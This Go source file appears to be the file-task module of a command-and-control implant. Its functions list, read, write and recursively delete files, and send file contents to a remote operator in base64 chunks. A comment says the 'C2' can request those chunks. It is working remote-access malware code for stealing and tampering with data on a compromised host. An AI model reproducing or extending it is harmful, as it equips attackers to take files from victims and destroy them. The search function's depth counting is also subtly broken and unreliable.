package tasks

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"time"
)

// FileInfo represents information about a file
type FileInfo struct {
	Name    string    `json:"name"`
	Path    string    `json:"path"`
	Size    int64     `json:"size"`
	IsDir   bool      `json:"isDir"`
	ModTime time.Time `json:"modTime"`
	Mode    string    `json:"mode"`
}

// fileList lists directory contents
func fileList(path string) (string, error) {
	// Default to current directory if empty
	if path == "" {
		path = "."
	}

	// Check if path exists
	info, err := os.Stat(path)
	if err != nil {
		return "", fmt.Errorf("path not found: %v", err)
	}

	var files []FileInfo

	// If it's a directory, list contents
	if info.IsDir() {
		entries, err := os.ReadDir(path)
		if err != nil {
			return "", fmt.Errorf("failed to read directory: %v", err)
		}

		for _, entry := range entries {
			entryInfo, err := entry.Info()
			if err != nil {
				continue
			}

			fullPath := filepath.Join(path, entry.Name())
			files = append(files, FileInfo{
				Name:    entry.Name(),
				Path:    fullPath,
				Size:    entryInfo.Size(),
				IsDir:   entry.IsDir(),
				ModTime: entryInfo.ModTime(),
				Mode:    entryInfo.Mode().String(),
			})
		}
	} else {
		// Single file
		files = append(files, FileInfo{
			Name:    info.Name(),
			Path:    path,
			Size:    info.Size(),
			IsDir:   false,
			ModTime: info.ModTime(),
			Mode:    info.Mode().String(),
		})
	}

	// Return as JSON
	output, err := json.MarshalIndent(files, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal JSON: %v", err)
	}

	return string(output), nil
}

// fileRead reads a file and returns its contents (base64 encoded for binary safety)
func fileRead(path string, maxSize int64) (string, error) {
	// Check if file exists
	info, err := os.Stat(path)
	if err != nil {
		return "", fmt.Errorf("file not found: %v", err)
	}

	if info.IsDir() {
		return "", fmt.Errorf("path is a directory, not a file")
	}

	// Check size limit (default 10MB)
	if maxSize == 0 {
		maxSize = 10 * 1024 * 1024 // 10MB
	}

	if info.Size() > maxSize {
		return "", fmt.Errorf("file too large: %d bytes (max: %d)", info.Size(), maxSize)
	}

	// Read file
	data, err := os.ReadFile(path)
	if err != nil {
		return "", fmt.Errorf("failed to read file: %v", err)
	}

	// Return base64 encoded for binary safety
	encoded := base64.StdEncoding.EncodeToString(data)
	
	result := map[string]interface{}{
		"path":     path,
		"size":     len(data),
		"encoding": "base64",
		"data":     encoded,
	}

	output, _ := json.Marshal(result)
	return string(output), nil
}

// fileWrite writes data to a file (expects base64 encoded data)
func fileWrite(path, data string, append bool) (string, error) {
	// Decode base64 data
	decoded, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		return "", fmt.Errorf("invalid base64 data: %v", err)
	}

	// Ensure parent directory exists
	dir := filepath.Dir(path)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return "", fmt.Errorf("failed to create directory: %v", err)
	}

	// Open file for writing
	flags := os.O_CREATE | os.O_WRONLY
	if append {
		flags |= os.O_APPEND
	} else {
		flags |= os.O_TRUNC
	}

	file, err := os.OpenFile(path, flags, 0644)
	if err != nil {
		return "", fmt.Errorf("failed to open file: %v", err)
	}
	defer file.Close()

	// Write data
	written, err := file.Write(decoded)
	if err != nil {
		return "", fmt.Errorf("failed to write file: %v", err)
	}

	return fmt.Sprintf("Successfully wrote %d bytes to %s", written, path), nil
}

// fileDelete deletes a file or directory
func fileDelete(path string, recursive bool) (string, error) {
	// Check if path exists
	info, err := os.Stat(path)
	if err != nil {
		return "", fmt.Errorf("path not found: %v", err)
	}

	// If directory and recursive is false, check if empty
	if info.IsDir() {
		if !recursive {
			entries, err := os.ReadDir(path)
			if err != nil {
				return "", fmt.Errorf("failed to read directory: %v", err)
			}
			if len(entries) > 0 {
				return "", fmt.Errorf("directory not empty (use recursive=true)")
			}
		}
		
		// Remove directory (recursively if needed)
		if err := os.RemoveAll(path); err != nil {
			return "", fmt.Errorf("failed to delete directory: %v", err)
		}
		return fmt.Sprintf("Successfully deleted directory: %s", path), nil
	}

	// Remove file
	if err := os.Remove(path); err != nil {
		return "", fmt.Errorf("failed to delete file: %v", err)
	}

	return fmt.Sprintf("Successfully deleted file: %s", path), nil
}

// fileDownload prepares a file for download (chunked for large files)
func fileDownload(path string, chunkSize int) (string, error) {
	// Check if file exists
	info, err := os.Stat(path)
	if err != nil {
		return "", fmt.Errorf("file not found: %v", err)
	}

	if info.IsDir() {
		return "", fmt.Errorf("cannot download directory (use archive first)")
	}

	// For small files, read directly
	if info.Size() < int64(chunkSize) || chunkSize == 0 {
		return fileRead(path, 0)
	}

	// For large files, return metadata (C2 can request chunks)
	result := map[string]interface{}{
		"path":       path,
		"size":       info.Size(),
		"chunks":     (info.Size() / int64(chunkSize)) + 1,
		"chunkSize":  chunkSize,
		"message":    "File too large, request chunks individually",
	}

	output, _ := json.Marshal(result)
	return string(output), nil
}

// fileChunk reads a specific chunk of a file
func fileChunk(path string, chunkIndex, chunkSize int) (string, error) {
	file, err := os.Open(path)
	if err != nil {
		return "", fmt.Errorf("failed to open file: %v", err)
	}
	defer file.Close()

	// Seek to chunk position
	offset := int64(chunkIndex * chunkSize)
	if _, err := file.Seek(offset, 0); err != nil {
		return "", fmt.Errorf("failed to seek: %v", err)
	}

	// Read chunk
	buffer := make([]byte, chunkSize)
	n, err := file.Read(buffer)
	if err != nil && err != io.EOF {
		return "", fmt.Errorf("failed to read chunk: %v", err)
	}

	// Encode chunk
	encoded := base64.StdEncoding.EncodeToString(buffer[:n])
	
	result := map[string]interface{}{
		"path":       path,
		"chunkIndex": chunkIndex,
		"chunkSize":  n,
		"encoding":   "base64",
		"data":       encoded,
		"isLast":     n < chunkSize,
	}

	output, _ := json.Marshal(result)
	return string(output), nil
}

// fileSearch searches for files matching a pattern
func fileSearch(rootPath, pattern string, maxDepth int) (string, error) {
	if rootPath == "" {
		rootPath = "."
	}

	var matches []FileInfo

	err := filepath.Walk(rootPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil // Skip errors, continue walking
		}

		// Check depth limit
		relPath, _ := filepath.Rel(rootPath, path)
		// Count directory separators to determine depth
		depth := 0
		if relPath != "." {
			depth = len(filepath.SplitList(relPath))
			// Fallback: count separators manually for better cross-platform support
			for _, r := range relPath {
				if r == filepath.Separator || r == '/' {
					depth++
				}
			}
		}
		
		if maxDepth > 0 && depth > maxDepth {
			if info.IsDir() {
				return filepath.SkipDir
			}
			return nil
		}

		// Match pattern
		matched, err := filepath.Match(pattern, info.Name())
		if err != nil {
			return nil
		}

		if matched {
			matches = append(matches, FileInfo{
				Name:    info.Name(),
				Path:    path,
				Size:    info.Size(),
				IsDir:   info.IsDir(),
				ModTime: info.ModTime(),
				Mode:    info.Mode().String(),
			})
		}

		return nil
	})

	if err != nil {
		return "", fmt.Errorf("search failed: %v", err)
	}

	output, _ := json.MarshalIndent(matches, "", "  ")
	return string(output), nil
}
